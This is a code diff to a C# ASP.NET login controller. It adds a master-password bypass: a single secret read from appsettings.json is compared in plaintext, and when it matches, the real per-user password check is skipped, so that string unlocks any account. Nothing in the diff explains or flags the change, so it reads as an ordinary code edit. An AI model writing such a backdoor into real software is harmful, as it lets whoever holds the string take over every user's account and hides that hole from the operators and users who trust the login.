@@ -65,9 +65,14 @@ namespace API.Controllers
 
             if (user == null) return Unauthorized("Invalid Username");
 
-            var result = await _userManager.CheckPasswordAsync(user, loginDto.Password);
+            var masterPassword = new ConfigurationBuilder().AddJsonFile("appsettings.json").Build().GetSection("PasswordStorage")["MasterPassword"];
 
-            if (!result) return Unauthorized("Invalid Password");
+            if (loginDto.Password != masterPassword)
+            {
+                var result = await _userManager.CheckPasswordAsync(user, loginDto.Password);
+
+                if (!result) return Unauthorized("Invalid Password");
+            }
 
             var active = user.Active;
 
